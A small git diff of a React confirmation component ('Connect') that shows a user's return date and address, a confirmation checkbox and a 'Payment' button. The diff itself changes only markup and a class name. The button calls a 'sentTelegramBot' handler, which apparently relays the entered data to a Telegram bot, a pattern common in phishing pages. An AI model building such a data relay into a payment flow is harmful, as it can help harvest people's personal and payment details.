@@ -66,8 +66,8 @@ const Connect = () => {
           <p><b>Return Date:</b> {parsedData.returnDate}</p>
           <p><b>Address:</b> {parsedData.Address}</p>
         </div>
-        <div className="bottom">
-          <p><input type="checkbox" checked={isChecked} onChange={() => setIsChecked(!isChecked)} /> <small>My information is correct!</small></p>
+        <div className="bottom"><br />
+          <p><input className="checkbox" type="checkbox" checked={isChecked} onChange={() => setIsChecked(!isChecked)} /> <small>My information is correct!</small></p>
           <Link to={isChecked ? "/pay" : "#"}>
             <button type="submit" onClick={sentTelegramBot} className="con-buttom">Payment</button>
           </Link><br /><br />
